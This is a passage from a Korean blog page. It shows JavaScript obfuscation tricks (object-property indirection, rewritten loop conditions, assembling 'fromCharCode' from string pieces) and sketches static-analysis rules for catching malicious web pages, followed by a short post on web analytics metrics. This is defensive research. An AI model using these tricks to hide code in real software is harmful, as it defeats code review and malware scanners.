<p><code>a = { q:"string" }.q;</code> 는 <code>a="string"</code> 과 같다.</p>

<p>좀 더 비틀어보자.</p>

<p><code>b={v:{q:{x:"string"}}}.v.q.x</code> 은 <code>b="string"</code> 과 같다.</p>

<pre><code>&gt; a = {q:"string"}.q
'string'
&gt; a
'string'
&gt; b={v:{q:{x:"string"}}}.v.q.x
'string'
&gt; b
'string'
&gt;
</code></pre>

<p>이건 for loop 를 비트는 흔한 기술법. <code>for(i=0;i-3782&lt;0;i++){...}</code> 는 <code>for(i=0;i&lt;3782;i++){...}</code> 와 같다.
아니면 변수를 RHS 에 놓는다. <code>for(i=0;0&gt;i-3782;i=-~i)</code></p>

<pre><code>&gt; for(i=0;0&gt;i-5;i=-~i)console.log(i);
0
1
2
3
4
&gt;
</code></pre>

<h3>Analysis</h3>

<h4>Static Approach</h4>

<p>지금 생각에 Index of Coincidence, Consonant Ratio, Special Character Ratio 등은 큰 의미가 없을 것 같다.</p>

<p>가정과 질문들은</p>

<ul>
<li>Redirection 을 해주는 1 단계 페이지들과 감염을 시키는 2 단계 페이지들을 분석할 때 방법론이 다르다.</li>
<li>모든 악성 웹사이트의 HTML/JavaScript 이 난독화 되어있지는 않다. 담백하게 작성된 것도 적지 않다.</li>
<li><p>VM 전단계에서 fast-filtering 을 목적으로 하는가 아니면, 특정부분은 VM 보다 나을 수 있는 Client Honeypot 시스템을 만드는가?</p></li>
<li><p>다음 각각은 특정한 용도가 있다.</p></li>
</ul>


<ol>
<li>CVE 중심으로 signature 를 찾는 것</li>
<li>HTML 정적 분석</li>
<li>JavaScript 정적 분석</li>
<li>JS 인터프리터와 DOM 에뮬레이터로 동적 분석하는 것</li>
<li>VM 기반의 동적 분석</li>
</ol>


<p>그리고 메모.</p>

<ul>
<li>AST 를 파싱해서 loop construct 안에 다량의 스트링 concatenation 이 있는 패턴을 잡기 위한 룰</li>
<li>for loop construct 하부 트리에 fromCharCode() 나 fromCharCode 의 clone 이 있는 패턴.</li>
<li>&lt;tag id=&ldquo;xyz&rdquo;> Encrypted Data &lt;tag> 와 같은 패턴을 잡기 위한 룰</li>
<li>Misplaced &lt;iframe> &amp; &lt;script>: &lt;html> 밖에 위치해 있거나, &lt;head> &lt;body> 의 밖에 위치한 태그들.</li>
<li>파싱해서 Tree 를 visit 하다가, MemberExpression 안에 BinaryExpression &lsquo;+&rsquo; 가 들어가 있으면 의심해볼 만하다. 정상적인 경우에는 <code>my_object["first_name"]</code> 이런 식으로 코딩하지, <code>my_object["first"+"_"+"name"]</code> 이렇게는 잘 안한다. String 을 [Function] 으로 변환하기 위해서는 String 이라던가 document 라던가 window 의 멤버 참조로 할 수 밖에 없기 때문에.</li>
</ul>


<pre>
> s=String;
[Function: String]
> f="f"+"r"+"omChar"
'fromChar'
> s[f+"Code"]
[Function: fromCharCode]
</pre>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/02/28/web-analytics/">Web Analytics</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-02-28T17:06:00+09:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>5:06 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>Visits</h3>

<p>Web Analytics 에서 쓰는 Visits 는 session 과 많은 경우에 동일하다.
Session 의 정의를 하자면 &ldquo;a collection of requests from someone who is on your website&rdquo; 라고 할 수 있다.</p>

<p>우선 세션에 대해서 알아보자.</p>

<p>JavaScript tag 기반의 web analytics 솔루션을 사용한다고 가정하자.</p>

<ol>
<li>웹사이트의 페이지를 처음으로 요청할때, 그 브라우저에 대해서 session 을 만든다.</li>
<li>그 브라우저에서 오는 계속된 요청은 unique session ID 와 묶이게 된다.</li>
<li>그 사람이 사이트를 떠나면, 그간의 요청된 page view 들을 unique session ID 로 묶어서 하나의 세션으로 처리.</li>
<li>Total Visits 는 주어진 기간동안의 모든 세션의 갯수들의 합.</li>
<li>29 분의 inactivity 가 있으면 세션을 끝내버린다.</li>
</ol>


<p>이 세션을 Visits 라고 흔히 말한다.</p>

<h3>Unique Visitors</h3>

<p>그렇다면 Unique Visitors 란?</p>

<p>역시 JavaScript tag 기반의 web analytics 솔루션을 사용한다고 가정.</p>

<ol>
<li>웹사이트의 페이지를 처음으로 요청할때, analytics tool 은 브라우저에 unique 한 쿠키를 세팅한다.</li>
<li>웹사이트를 떠나도 그 unique 한 쿠키는 살아있는다.</li>
<li>그 브라우저를 가지고 웹 사이트를 방문할 때마다, persistent unique cookie ID 를 가지고 동일한 브라우저인지를 판별한다.</li>
<li>Unique Visitors 는 주어진 기간동안의 &ldquo;the count of all the persistent unique cookie IDs&rdquo; 라고 할 수 있다.</li>
</ol>


<h3>Metric 의 유행</h3>

<p>Hits -> Page Views -> Visitors 로 중요 메트릭이 변해가다가&hellip;</p>

<p>Bounce Rate, Exit Rate, Conversion Rate, Engagement 같은 메트릭이 중요하게 여겨지고 있다.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/21">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/19">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/03/03/the-drown-attack/">The DROWN Attack</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/25/mnist-for-ml-beginners/">MNIST for ML Beginners</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/">Understanding the Heap &amp; Exploiting Heap Overflows</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security/">Unlocking the Motorola Bootloader by Azimuth Security</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
